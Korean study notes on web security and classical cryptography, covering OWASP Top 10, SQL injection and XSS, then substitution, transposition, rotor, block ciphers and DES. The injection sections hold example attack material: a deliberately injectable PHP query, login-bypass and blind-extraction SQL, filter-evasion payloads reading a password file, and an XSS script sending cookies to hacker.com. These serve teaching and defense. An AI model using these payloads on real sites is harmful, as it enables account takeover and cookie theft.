<h1>SECURITY</h1>

- [OWASP](#owasp)
  - [OWASP top 10](#owasp-top-10)
  - [SQL Injection](#sql-injection)
    - [blind sql injection](#blind-sql-injection)
    - [sql injection 방어](#sql-injection-방어)
  - [XSS (Cross-Site Scripting)](#xss-cross-site-scripting)
    - [저장 XSS 공격 (Stored 방식)](#저장-xss-공격-stored-방식)
    - [반사 XSS 공격 (Reflective 방식)](#반사-xss-공격-reflective-방식)
    - [DOM XSS 공격](#dom-xss-공격)
    - [XSS 방어](#xss-방어)
- [CLASSICAL ENCRYPTION](#classical-encryption)
  - [Symmetric Cipher Model](#symmetric-cipher-model)
  - [Substitution techniques](#substitution-techniques)
    - [Monoalphabetic ciphers](#monoalphabetic-ciphers)
      - [Caesor Cipher(Shift Cipher)](#caesor-ciphershift-cipher)
      - [Permutation Cipher](#permutation-cipher)
      - [Playfair Cipher](#playfair-cipher)
    - [Polyalphabetic Ciphers](#polyalphabetic-ciphers)
      - [Vigenere Cipher](#vigenere-cipher)
      - [Vigenere autokey Cipher](#vigenere-autokey-cipher)
      - [Vernam Cipher](#vernam-cipher)
      - [One-Time Pad](#one-time-pad)
  - [Transposition Thechniques](#transposition-thechniques)
    - [Rail Fence Cipher](#rail-fence-cipher)
    - [Row Transposition Cipher](#row-transposition-cipher)
  - [Rotor Machines](#rotor-machines)
- [BLOCK CIPHER and DES](#block-cipher-and-des)
  - [classification of symmetric encryption](#classification-of-symmetric-encryption)
    - [stream ciphers](#stream-ciphers)
    - [block ciphers](#block-ciphers)
  - [block cipher](#block-cipher)
    - [feistel cipher](#feistel-cipher)
  - [the data encryption standard(DES)](#the-data-encryption-standarddes)
    - [encryption and decryption](#encryption-and-decryption)
    - [strength of DES](#strength-of-des)
- [AES(Advanced Encryption Standard)](#aesadvanced-encryption-standard)
  - [Why Finite Field for Block Cipher](#why-finite-field-for-block-cipher)
  - [General Structure](#general-structure)
    - [State](#state)
    - [Parameters Correspoding to the Key Size](#parameters-correspoding-to-the-key-size)
    - [SPN(Substitution-Permutation Network)](#spnsubstitution-permutation-network)
  - [Detailed Structure](#detailed-structure)
  - [AES Transformation Function](#aes-transformation-function)
    - [Substitute Bytes](#substitute-bytes)
    - [Rationale for S Box](#rationale-for-s-box)
    - [Shift Rows](#shift-rows)
    - [Mix Columns](#mix-columns)
    - [Add Round Key](#add-round-key)
  - [AES Key Expansion](#aes-key-expansion)
    - [Key Expansion Algorithm](#key-expansion-algorithm)
    - [Rationale for Key Expansion](#rationale-for-key-expansion)

# OWASP
**OWASP**, *The Open Web Application Security Project*는 웹 해킹에 대한 보안 향상을 목표로 만들어진 전 세계적인 비영리 단체이다. 대표적으로 보안 취약점 top 10과 Guide를 제공한다.
- Development Guide
- Code Review Guide
- Testing Guide

## OWASP top 10
보안을 전문으로 다루는 기업들의 데이터를 토대로 가장 보안에서 주의하야할 **10가지 부문**을 선정한다. 선정 기준은 기업, application에 대한 *취약점 정보를 바탕으로 위험도, 발생 빈도* 등 다양한 요소를 고려한다. 개발자는 다른 조직의 과실로부터 개선점을 찾고 경영진은 보안이 취약할 때의 위험을 어떻게 관리할지 참고할 수 있다.  보안 취약점 상위 10개에 빠지지 않고 선정되는 것이 **SQL injection**과 **XSS**이다.   

[OWASP Top 10 Web Application Security Risks](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project)
<details>
    <summary><span style="color:grey">클릭하여 펼쳐보기</span></summary>

1. [Injection](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection). Injection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.
2. [Broken Authentication](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-Broken_Authentication). Application functions related to authentication and session management are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities temporarily or permanently.
3. [Sensitive Data Exposure](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure). Many web applications and APIs do not properly protect sensitive data, such as financial, healthcare, and PII. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. Sensitive data may be compromised without extra protection, such as encryption at rest or in transit, and requires special precautions when exchanged with the browser.
4. [XML External Entities (XXE)](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A4-XML_External_Entities_(XXE)). Many older or poorly configured XML processors evaluate external entity references within XML documents. External entities can be used to disclose internal files using the file URI handler, internal file shares, internal port scanning, remote code execution, and denial of service attacks.
5. [Broken Access Control](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control). Restrictions on what authenticated users are allowed to do are often not properly enforced. Attackers can exploit these flaws to access unauthorized functionality and/or data, such as access other users’ accounts, view sensitive files, modify other users’ data, change access rights, etc.
6. [Security Misconfiguration](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration). Security misconfiguration is the most commonly seen issue. This is commonly a result of insecure default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information. Not only must all operating systems, frameworks, libraries, and applications be securely configured, but they must be patched/upgraded in a timely fashion.
7. [Cross-Site Scripting XSS](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A7-Cross-Site_Scripting_(XSS)). XSS flaws occur whenever an application includes untrusted data in a new web page without proper validation or escaping, or updates an existing web page with user-supplied data using a browser API that can create HTML or JavaScript. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.
8. [Insecure Deserialization](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A8-Insecure_Deserialization). Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation attacks.
9. [Using Components with Known Vulnerabilities](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities). Components, such as libraries, frameworks, and other software modules, run with the same privileges as the application. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications and APIs using components with known vulnerabilities may undermine application defenses and enable various attacks and impacts.
10. [Insufficient Logging & Monitoring](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A10-Insufficient_Logging%252526Monitoring). Insufficient logging and monitoring, coupled with missing or ineffective integration with incident response, allows attackers to further attack systems, maintain persistence, pivot to more systems, and tamper, extract, or destroy data. Most breach studies show time to detect a breach is over 200 days, typically detected by external parties rather than internal processes or monitoring.

</details>


## SQL Injection
SQL, OS, LDAP injection과 같은 **injection 취약점**은 신뢰할 수 없는 데이터가 명령어나 query의 일부로써 인터프리터로 전송될 때 발생한다. 공격자가 삽입한 데이터는 인터프리터를 속여 **악의적인 명령어를 실행하거나 권한이 없는 데이터에 접근**할 수 있다. 이중에서 SQL injection은 응용 프로그램 보안상의 취약점을 이용하여 개발자가 의도하지 않은 sql을 실행하여 데이터베이스를 비정상적으로 조작하는 code injection attack 방식이다.

**일반적인 웹앱의 호출방법**은 아래와 같다.

    http://www.abc.com/home.php?id=admin&password=1234

**일반적인 mysql을 다루는 php 파일구조**는 아래와 같다.

```php
<?php
  include("./lib/mysql-lib.php");
  mysql_open();
  $query_results = mysql_query("SELECT * FROM usr 
                                WHERE id = `".$_GET['id]"`
                                AND pw = `"$_GET['password']"`");
  $USER_INFO = mysql_fetch_array($query_results);
  ...
?>
```

**정상적인 query**
id가 admin이고 password가 1234인 경우, 아래와 같이 query가 사용되고 query가 참일 경우 로그인에 성공한다.

```sql
SELECT * FROM usr WHERE id = 'admin' AND pw = '1234';
```

**sql injection을 위한 웹앱 호출의 예시**
    
    http://www.abc.com/home.php?id=admin%27%20OR%201%3D1%20--&password=d0be2cd421

**sql injection의 결과 실제 호출외는 sql query**
```sql
SELECT * FROM usr WHERE id = 'admin' OR 1=1 -- AND pw = 'd0be2cd421';
```
**'--'** 는 MySql의 주석(comment)기호이다. 따라서 뒤에 이어지는 Sql query를 무효화한다.
위의 결과는 언제나 참이므로 admin 계정으로 로그인 하게 된다.

**하지만** 일반적인 경우 서버의 소스코드는 공개되지 않기 때문에 해커의 감각이나, 내부구조를 파악할 수 있도록 의도된 공격을 통해 sql injection이 가능하도록 알아내야한다

### blind sql injection
공격하려는 웹앱이 sql injection에 취약하지만 데이터베이스 메세지가 공격자에게 보이지 않을 때 사용하는 공격방식이다. query에 대한  true/false의 응답을 통해 sql injection이 가능하도록 추측한다.

**blind sql injection 예시**

1. 취약점 확인 절차
    ```sql
    SELECT * FROM usr WHERE id = 1 and 1=1 #;
    SELECT * FROM usr WHERE id = 1 and 1=2 #;
    ```
    만약 위 2개의 query결과로 true, false를 얻었다면 위 웹앱은 blind sql injection에 대해 취약점이 있다고 판단 할 수 있다.  

2. 공격 세부절차 1
    ```sql
    SELECT * FROM usr WHERE id = 1 and length(pw)=? #;
    ```
    위 공격의 결과로 얻는 숫자값이 id가 1인 유저의 비밀번호의 길이이다.  

3. 공격 세부절차2
    ```sql
    SELECT * FROM usr WHERE id = 1 and substr(pw,0,1)='a' #;
    ```
    위 공격의 결과가 true이면 비밀번호의 첫번째 글자는 a라는 것을 알 수 있다.  

4. 공격 세부절차3
    모든 경우의 수에 대해 비밀번호를 확인해보면 id가 1인 유저의 비밀번호를 획득할 수 있다.

### sql injection 방어

1. 변수확인
    sql injection을 방어하는 기본적인 방법은 **변수확인**이다. *blind sql injection 공격*을 위한 sql query는 일반적인 query보다 **비정상적으로 긴 경우가 대부분**이다. 변수의 길이를 확인하여 유효성을 체크한다면 상당부분의 sql injection공격을 무력화 하는 것이 가능하다. php의 경우 *mysql_real_escape_string()* 과 같은 함수를 이용할 수 있다.

2. 필터링
    sql query에 사용되는 문자 및 단어들을 전부 **필터링**한다. 공백문자, '#', '=', 'and', 'or', '--'등의 sql **예약어를 사용하지 못하게** 한다.
    1. 필터링을 회파하는 방법 1
        주석기호(/**/)를 이용하여 공백을 제거하는 필터링을 회피한다. sql에 입력되기전에 처리하는 서버언어에서 주석기호를 공백으로 바꾸기 때문에 가능하다.
        ```sql
        /**/UNION/**/SELECT/**/*/**/FROM/**/usr--
        ```
    2. 필터링을 회파하는 방법 2
        char() 함수를 이용하여 문자를 입력하는 방식이다.
        ```sql
        UNION SELECT*(load_file(char(47,112,97,115,115,119,100)))--
        ```
    3. 필터링을 회파하는 방법 3
        16진수 표현을 이용하여 문자를 입력하는 방식이다.
        ```sql
        UNION SELECT*(load_file(0x6333a2f626f6f742e696e69))--
        ```  

3. 비노출 에러메세지
    sql query에 대한 응답의 결과만으로도 상당히 **민감한 정보**가 된다는 것을 알았다. 이런 정보를 사용자에게 **보여주지 않는** 방법이다.  

4. 최소 권한 유저로 데이터베이스 운영
    혹여나 공격자가 sql injection에 성공하더라도 다른 table이나 다른 database에 접근하지 못하도록 **권한을 최소한** 으로 유지해야한다.  

5. 신뢰할 수 있는 네트워크, 서버에 대한 접근 허용
    특정 기관 또는 회사등에서 사용하는 경우라면 **외부의 접근** 자체를 막을 수도 있다. 이는 **공격자가 외부**에서 접근하려는 경우에 사용가능하다.   

[링크](https://paiza.io/en/projects/new?language=mysql)에서 sql injection과 관련된 해킹기법을 연습해 볼 수 있다.

## XSS (Cross-Site Scripting)
**XSS 취약점**은 application이 신뢰할 수 없는 데이터를 브라우저에 전송하는 과정에서 validating과 escaping과 같은 적절한 **검증이 없을 경우에 발생**할 수 있다. XSS는 공격자가 공격 대상의 브라우저에서 script를 실행하여 사용자의 session정보를 훔히는 hijacking, 혹은 웹 사이트 변조(deface)등의 공격을 지칭한다. 즉, 웹 서버를 공격하는 방식이 아니라 **client를 공격하는 방식**이라는 점이 특징이다.  

게시판과 같이 동적으로 생성되는 Page에 조작된 코드를 넣는 방식이다. 아래와 같은 방식으로 session정보를 탈취하여 정보를 악용할 수 있다.
```html
<script>
String strCookie = Document.GetCookie();    // session 및 login정보등이 담겨있을 수 있다.
Redirect(http://www.hacker.com/SaveCookie?Data=strCookie);
</script>
```

XSS는 방법에 따라 3가지로 분류할 수 있다.
### 저장 XSS 공격 (Stored 방식)
XSS 웹 취약점이 있는 서버에 공격용 스크립트를 입력시키는 방식을 말한다. 방문자가 악성 스크립트가 삽입되어 있는 페이지를 읽으면 악성 코드가 실행된다.

### 반사 XSS 공격 (Reflective 방식)
악성 스크립트가 포함된 URL을 사용자가 클릭하도록 유도하는 방식을 말한다. 
```html
http://www.google.com/search/?q=<script>alert(document.cookie)</script>&x=0&y=0
```

### DOM XSS 공격
피해자의 브라우저가 HTML 페이지를 구문 분석할 때마다 공격 스크립트가 DOM생성의 일부로 실행되면서 공격하는 방식을 말한다. 페이지 자체는 변하지 않지만 페이지에 포함되어 있는 브라우저측 코드가 DOM 환경에서 악성코드로 실행된다. DOM기반 XSS는 서버와 관계없이 브라우저에서 발생하는 것이 특징이다.
```html
http://www.google.com/page.html#default=<script>alert(document.cookie)</script>
```
### XSS 방어
필터링
"<", ">", "(", ")", "#", "&", "'", """와 같은 기호를 필터링하는 방식이다. 또한 script, javascript, vbscript, cookie, location등과 같은 단어를 필터링할 수 있다. "<", ">"입력시에는 "&lt;", "&gt;"으로 인코딩하여 방어할 수도 있다.
```javascript
const removeBad = (URL) => {
    URL = URL.replace(/₩</g, "");
    URL = URL.replace(/₩>/g, "");
    URL = URL.replace(/₩#/g, "");
    ...
    return URL;
}
```
**이러한 방어**는 코드가 자바스크립트로 되어 있기 때문에 공격자가 **버프스위트 등의 proxy를 사용하여 극복**가능하다는 한계가 있다. 이런 한계는 아래와 같이 방어 코드를 서버에 올려놓는 것으로 어느정도 극복할 수 있다. 하지만 이는 서버성능에 영향을 주기때문에 개발자의 판단하에 방어기법을 선택할 수 있다.
```PHP
function xss_filter($content) {
/* IE6과 7의 expression() 기능을 이용한 취약점을 방지하기 위해 <meta httpequiv="X-UA-Compatible" content="IE=edge" />를 반드시 붙여야 한다. */
    // 악성 태그들 모두 제거
    $content = preg_replace('/(<)(|\/)(\!|\?|html|head|title|meta|body|script|style|base|noscript|form|input|select|option|optgroup|textarea|button|label|fieldset|legend|iframe|embed|object|param|frameset|frame|noframes|basefont|applet|isindex|xmp|plaintext|listing|bgsound|marquee|blink|noembed|comment|xml)/i', '&lt;$3', $content);
    // 스크립트 핸들러를 모두 제거
    $content = preg_replace_callback("/([^a-z])(o)(n)/i", create_function('$matches', 'if($matches[2]=="o") $matches[2] = "&#111;";else $matches[2] = "&#79;"; return $matches[1].$matches[2].$matches[3];'), $content);
    return $content; 
}
```
[링크](http://xss-quiz.int21h.jp)에서 xss와 관련된 해킹기법을 연습해 볼 수 있다.

# CLASSICAL ENCRYPTION
1950-60년대에 주로 사용되었던 고전 암호체계이다. **Substitution techniques**, **Transposition Thechniques**, **Roter Machines**, **Steganography**등이 있다. 암호쳬계는 고대시절부터 존재한 개념으로 주로 군대나 정부기관의 필요에 의해 개발되었고 최근에는 학술적으로도 많은 관심을 받는 분야이다. 
 
## Symmetric Cipher Model
<img src="https://user-images.githubusercontent.com/44011462/93840586-df1cf900-fccb-11ea-8cb5-2b77ce605096.png" width=300px>  
<img src="https://user-images.githubusercontent.com/44011462/93840804-9fa2dc80-fccc-11ea-9a01-738f400208b5.png" width=300px>  

**암호화할 때의 key와 복호화할 때의 key가 같도록** 하는 방식이다. 암호화하는 쪽과 복호화하는 쪽이 모두 동일한 암호키를 가지고 있어야 한다. 따라서 공격자는 cipher text를 갈취한다고 하여도 암호키가 없다면 plain text를 알수 없다. 이런 **암호화 방식은 표준화**가 되어있어서 이루어지는 모든 방식을 누구라도 알수 있다. 따라서 **사용되는 key가 안전해야**한다.

## Substitution techniques
plain text를 구성하는 글자, 숫자, 기호가 다른것으로 **대체**되는 것을 말한다. 

### Monoalphabetic ciphers
하나의 글자를 다른 하나의 글자로 바꾸는 방식을 말한다. **caesor cipher**, **shift cipher**, **permutation cipher**, **playfair cipher**와 같은 방식이 있다.

#### Caesor Cipher(Shift Cipher)
이런 방식중 가장 고전적인 방식이 고대 로마시절에 율리우스 시저황제가 사용했던 방식인 Caesar Cipher이다. alphabet을 n칸씩 오른쪽으로 이동시키는 방식으로 가능성이 26가지로 **규칙이 매우 단순**한 것이 특징이다.   

<img src="https://user-images.githubusercontent.com/44011462/93841242-e7763380-fccd-11ea-98e9-775a913d1c46.png" width=300px>

#### Permutation Cipher
다음은 Caesar 방식의 단순함을 어느정도 극복한 Permutation Cipher이다. 알파벳이 대응되어야 하는 부분을 n칸씩 정한것이 아닌, **모든 알파벳에 대하여 임의로 알바펫을 대응**시키는 방식이다. 

<img src="https://user-images.githubusercontent.com/44011462/93841511-c6faa900-fcce-11ea-8106-feb4699d7c09.png" width=300px> 

26!개의 방식이 있기때문에 당시에는 **일일이 해보기에는 어려운 방식**이었다. 하지만 영어에는 자주 쓰이는 알파벳이 정해져있다. plain text에서 많이나오는 E와 같은 알파벳은 Cipher text에도 가장 많이 등장하는 알파벳이라는 것을 알 수 있다.

<img src="https://user-images.githubusercontent.com/44011462/93841683-53a56700-fccf-11ea-859e-75b398f5f060.png" width=300px>

게다가 영어에는 the, th, ph등등 주로 짝지어서 사용하는 몇몇 알파벳이 있다. 이런 조합을 사용하여 추측해보면 **충분히 key가 없이도 해독이 가능하다는 한계**가 있다.

#### Playfair Cipher
앞서 본 것처럼 한 글자를 다른 한 글자에 대응시키지 않고 두 글자를 다른 두 글자로 바꾸는 방식이다. 따라서 26글자가 26글자로 대응되는 shift cipher와 다르게 <img src="https://user-images.githubusercontent.com/44011462/94516279-6cc68e80-0260-11eb-85e7-4031db98d623.png" height=20px>글자가 <img src="https://user-images.githubusercontent.com/44011462/94516279-6cc68e80-0260-11eb-85e7-4031db98d623.png" height=20px>글자로 대응되는 방식이다. 5*5크기의 2차원 행렬을 기반으로 작성되며 1차대전에 실제로 야전에서 사용된 암호체계이다. 

<img src="https://user-images.githubusercontent.com/44011462/94503362-3d545980-0241-11eb-9714-f719a3d96f86.png" width=300px>

위의 표처럼 이미 알려진 키워드가 MONARCHY라면 그 각각의 알파벳을 행렬에 차례로 넣고, 나머지 알파벳을 이어서 넣는다. 알파벳이 칸보다 1개더 많으므로 i와 j는 같이 기입한다는 규칙을 정한다. 

이후로 다음과 같은 4가지 규칙을 이용하여 text를 암호화한다. 복호화하는 경우는 암호화를 반대로 한다. 
1. 연속된 같은 두 알파벳은 filler charactor를 넣어 떨어뜨린다. 이때 filler는 'x'와 같이 드문 알파벳을 정한다.
    >ex) balloon -> balxloon -> ba lx lo on
    복호화의 경우에는 문맥상 제거하는것이 자연스럽게 가능하다.

2. 두 알파엣이 같은 행에 있다면, table의 row(행)에서 오른쪽에 있는 값을 대입하여 바꾼다.
    >ex) ar <-> RM

3. 두 알파엣이 같은 열에 있다면, table의 col(열)에서 아래쪽에 있는 값을 대입하여 바꾼다.
    >ex) mu <-> CM

4. 위 두가지 경우가 아니라면, table의 digonal(대각선)에서 대칭되는 다른 대각선에 있는 값을 같은 행에 있는 값으로 대입하여 바꾼다.
    >ex) hs <-> BP, ea <-> IM, in -> GA, it -> KS
    같은 i이지만 짝지어진 글자에 따라서 다른 글자로 바뀐다.

<img src="https://user-images.githubusercontent.com/44011462/94504790-8eb21800-0244-11eb-82ae-fe45468f2ffe.png" width=300px>  

일반 평문에서 등장하는 알파벳을 빈도수로 표현한 그래프이다. playfair cipher를 이용하면 앞서 shift cipher와 permutation cipher에서 보여주었던 **'통계적인 추론'이 가능하다는 문제가 어느정도 극복**된 것을 볼 수 있다.

### Polyalphabetic Ciphers
한개의 글자를 한개로, 또는 두개의 글자를 두개로 대응시키는 방식이  한계를 갖는 점을 극복하자는 방식이다. 

#### Vigenere Cipher
평문과 길이가 동일한 암호키를 이용하여 암호화시키며 **shift cipher를 여러개를 동시에 사용하는 효과**가 있는 방식이다. 이때 암호키는 특정 길이를 갖는 단어를 반복적으로 사용하여 길이를 맞춘다. 이 암호체계는 16세기에 이탈리아의 Bellaso라는 사람이 처음으로 만들었지만 19세기에 Vigenere에 의해 재발견된 암호체계이다.

<img src="https://user-images.githubusercontent.com/44011462/94505020-26176b00-0245-11eb-9cc6-9fc9a1a86876.png" width=300px>  

####  Vigenere autokey Cipher
위의  vigenere cipher방식이 key가 반복되어 통계적인 파훼법이 통한다는 한계를 극복하는 방식이다. key의 길이만큼 단계적으로 복호화된다.

<img src="https://user-images.githubusercontent.com/44011462/94505894-1731b800-0247-11eb-8b86-4d128b6b8a71.png" width=300px>  

#### Vernam Cipher
at&t에 근무하던 vernam이 만든 암호체계이다. 알파벳을 그래도 사용하지 않고 코드체계를 이용하여 bit sequence로 바꾼 후 key word에 해당하는 bit sequence를 이용하여 암호화하는 방식이다. 

<img src="https://user-images.githubusercontent.com/44011462/94506275-f3bb3d00-0247-11eb-8da8-93fe2f348ffc.png" width=300px>  

#### One-Time Pad
key word의 cycle이 없도록 하여 통계적인 추론이 불가능하도록 하는 방식이다. 기본적인 암호화방식은 vernam cipher의 bit 방식을 이용한다. 이 방식은 이론적으로 깰 수 없음이 증명된 안전한 암호체계이다. 하지만 이 방식은 실용적이지 않다는 한계가 있다. 매우 임의적으로 생성된 random key를 안전하게 공유하는 방식이 매우 까다롭다. key를 안전하게 보낼 수 있는 통로가 있다는 가정 자체가 어렵다. 그런 방식이있다면 그 방식으로 plain text를 주고 받으면 된다는 것이다. 혹은 가까운 미래에 암호통신을 이용할 수 있다는 가정하에 암호키가 적힌 hard copy를 전달한 후에 1회 사용후 폐기한다. 하지만 역시 실용적이지 않다.

## Transposition Thechniques
글자 순서를 바꾸는 암호방식이다. 

### Rail Fence Cipher
고대 그리스에서 사용하던 skytale이라는 방법과 유사하다. **depth**라는 개념이 도입되는데 예시를 통해 이해하자

> (depth = 2)
> meet me after toga party
> -> m e m a t r h t g p r y    
> ......    e t e f e t e o a a t
> -> MEMATRHTGPRYETEFETEOAAT  

### Row Transposition Cipher
key로는 숫자 n을 이용하여 1부터 n까지의 수를 permutation하여 key를 구성한다. 앞서 이용한 방법과 유사하 plain text를 행으로 n개씩 나열하고 key의 1번부터 n번까지 열로 읽어서 암호화한다. 딱 맞아 떨어지도록 빈칸에는 filler를 넣어 완성한다.

<img src="https://user-images.githubusercontent.com/44011462/94507372-91b00700-024a-11eb-8d44-1a7dd1fd7ae3.png" width=300px>  

이 방식은 여러번 중첩하여 쓸 수 있다. 이렇게 암호방식을 여러번 중첩하여 적용시키는 방식은 현대적인 암호에서도 널리 이용되고 있다.

## Rotor Machines
<img src="https://user-images.githubusercontent.com/44011462/94507744-60840680-024b-11eb-9525-3c7a154eebe6.png" width=300px>  
<img src="https://user-images.githubusercontent.com/44011462/94507804-81e4f280-024b-11eb-95e6-fea14bcc162c.png" width=300px>  

위 사진은 세계 2차 대전때 독일군이 사용하던 enigma이다. 컴퓨터를 만든 사람중에서 hardware쪽 분야는 폰노이만이 유명하지만 software쪽 분야로는 엘런 튜링이 유명하다. 바로 이 enigma를 해독하는 과정에서 만든 기계가 최초의 컴퓨터이다. 

<img src="https://user-images.githubusercontent.com/44011462/94508360-cd4bd080-024c-11eb-8211-bd66e2cb764c.png" width=600px>  

ABC라는 plain text는 EIB로 암호화 된다. 하지만 한번 사용하고나면 기계적으로 rotor가 회전하며 다음에 ABC는 YDO가 된다. enigma를 통해 나온 암호의 가지수는 <img src="https://user-images.githubusercontent.com/44011462/94516038-e611b180-025f-11eb-973c-434f974879b7.png" height=20px> 정도로 상당히 많다. 세계 2차대전때 당시의 기술로 <img src="https://user-images.githubusercontent.com/44011462/94516038-e611b180-025f-11eb-973c-434f974879b7.png" height=20px>가지의 모든 경우의 수를 대입해보는데는 일주일이 넘게 걸렸는데, 독일군은 하루에 한번씩 enigma를 설정하는 암호key를 전달하여 매우 안전성이 좋은 암호체계로 동작했다. 

# BLOCK CIPHER and DES

## classification of symmetric encryption
현대 대칭 암호 체계는 stream cipher, block cipher의 두 가지로 분류한다. 

여러가지 **stream cipher** 방식은 난수를 이용하여 symmetric cipher를 이용하는 방식이다. 암호학적으로 가장 이상적인 방식으로 one-time pad가 있다. 하지만 현실적으로 비효율적인 방식이라는 한계가 있다. 반면에 vernam cipher는 어느정도 단점을 보완하고 장점을 살린 것이 방식이다. 하지만 역시 단순하다는 한계가 있다. 이런 두가지 장점을 모두 살리고 단점을 보완한 방식이 stream cipher이다.  
<img src="https://user-images.githubusercontent.com/44011462/94510638-38e46c80-0252-11eb-9567-c6dbfe16e60c.png" height=140px> <img src="https://user-images.githubusercontent.com/44011462/94510626-3255f500-0252-11eb-9f83-9bdc60e06746.png" height=140px>  

대부분의 **stream cipher는 통계적인 부분에서 취약**점이 있다. 통계적인 한계를 극복하기 위한 방식은 암호키를 관리하는 측면이 까다로워지는 tradeoff 관계가 있다는 근본적인 한계가 있다.
<img src="https://user-images.githubusercontent.com/44011462/94504790-8eb21800-0244-11eb-82ae-fe45468f2ffe.png" width=300px>  

**block cipher**는 암호화하는 쪽과 복호화하는 쪽이 모두 보안키를 가져야 한다는 점에서는 symmetric cipher방식과 동일하다. 하지만 stream cipher가 갖는 통계적인 한계를 극복하기 위해서 plain text를 글자단위, 혹은 bit단위로 암호화하지 않고 **64bits, 128bits등의 아주 큰 단위로 대응**시키는 방식이다. 이런 방식은 통계적인 방법을 사용할 자료가 거의 없다는 장점이 있어서 **stream cipher의 근본적인 한계를 극복**할 수 있다. 현대 암호에서도 사용하는 방식이다.

<img src="https://user-images.githubusercontent.com/44011462/94511303-e6a44b00-0253-11eb-8da8-747a77f5989a.png" width=300px>  

위 자료는 4bits를 기준으로 했을때 key를 만드는 과정이다. 4bits를 이용하므로 암호key의 경우의 수는 <img src="https://user-images.githubusercontent.com/44011462/94516610-2291dd00-0261-11eb-8677-78c9c15960d7.png" height=20px>정도의 경우가 존재한다. 실제로는 64bits, 또는 128bits를 이용하는데 128bits를 이용하여 암호key를 만드는 경우의 수는 <img src="https://user-images.githubusercontent.com/44011462/94516477-db0b5100-0260-11eb-9064-84ea30dc266a.png" height=20px> = <img src="https://user-images.githubusercontent.com/44011462/94511517-8cf05080-0254-11eb-9a1a-2e0d6daa79ce.png" height=20px>이라는 상당히 큰 수가 된다. 따라서 **통계적인 접근은 의미가 없게 된다는 것이 block cipher의 특징**이다. 이런 암호key는 정보량이 상당히 많아서 key로 table와 같은 key-value를 전달하지 않고 입력에 따라 출력이 달라지는 알고리즘을 이용한다. 

### stream ciphers
deterministic bit-stream generator를 이용한다. 특정 입력이 있다면 항상 같은 값의 bit-stream을 출력한다. 

### block ciphers
두 글자, 혹은 더 많은 글자를 다른 글자로 대체하는 polyalphabetic Ciphers를 이용하면 한 가지 글자를 다른 한 글자로 바꾸는 monoalphabetic Ciphers보다 더 암호화 성능이 뛰어나다는 것을 알고 있다. 이런 성능 우위에 초점을 두어 확장한 방식이 block cipher방식이다. **block cipher 방식은 64bits 단위 혹은 128bits 단위로 묶어서 대체하는 방식**이다. 이 방식도 일종의 substitution cipher방식이다.   

<img src="https://user-images.githubusercontent.com/44011462/94511303-e6a44b00-0253-11eb-8da8-747a77f5989a.png" width=300px>    

앞서 설명한 것처럼 4bits를 하나로 묶는 경우 4가지 bit로 표현 가능한 숫자는 0부터 15까지 16가지이다. 이 숫자를 각기 다른 숫자에 매핑하여 대체하는 방식이다. 위 예시는 0b0000은 0b1101로, 0b0001은 0b0100으로 대체하고 있다. 따라서 <img src="https://user-images.githubusercontent.com/44011462/94516610-2291dd00-0261-11eb-8677-78c9c15960d7.png" height=20px> 의 경우의 수 중에서 한 가지이다. 이때 monoalphabetic Ciphers의 한 방식인 permutation cipher를 이용한 경우에는 <img src="https://user-images.githubusercontent.com/44011462/95153621-d0a20780-07ca-11eb-9333-9d431c3d2c86.png" height=20px>의 경우의 수가 있다.   
따라서 block cipher의 block 단위를 64bits, 128bits로 확장하면 이는 monoalphabetic Ciphers, polyalphabetic Ciphers에 비교하면 경우의 수가 상당히 다양해진다. 다만 block cipher가 128bits를 이용한다면  <img src="https://user-images.githubusercontent.com/44011462/94516477-db0b5100-0260-11eb-9064-84ea30dc266a.png" height=20px> = <img src="https://user-images.githubusercontent.com/44011462/94511517-8cf05080-0254-11eb-9a1a-2e0d6daa79ce.png" height=20px>라는 상당히 많은 경우의 수를 가지고 있으므로, 이 모든 **key-value를 전달하기에는 정보의 양이 상당히 많다**.  
이 모든 key-value의 정보를 전달할 수 없기 떄문에 보통의 경우 block cipher는 128bits의 특정 숫자를 입력하면 결과값이 출력되는 함수의 형태로 전달한다. 함수자체가 노출되면 그대로 암호테이블 전체가 노출되는 결과로 이어지기 때문에 함수에는 **특정 매개변수를 제공**하여 여러가지 경우의 수에서 원하는 방식을 선택하도록 한다. key에 따라서 존재하는 경우의 수는 <img src="https://user-images.githubusercontent.com/44011462/95154004-c9c7c480-07cb-11eb-8e88-0d19b0c560ba.png" height=20px>가지이므로 이 수 역시 매우 크기 때문에 함수의 **매개변수가 안전하다면 암호화 함수가 노출되어도 안전**하다고 볼 수 있다.


## block cipher

### feistel cipher
feistel cipher는 substitution과 permutation의 조합으로 만들어지는 암호체계이다. 참고로 여기에서 말하는 substitution과 permutation은 monoalphabetic Ciphers의 방식을 말하는 것이 아닌 말 그대로 치환하는 것(substitute)과 전치하는 것(permute, transpose)을 말한다.

<img src="https://user-images.githubusercontent.com/44011462/95155007-20ce9900-07ce-11eb-91d9-e115a1c0bc8a.png" width=300px> 

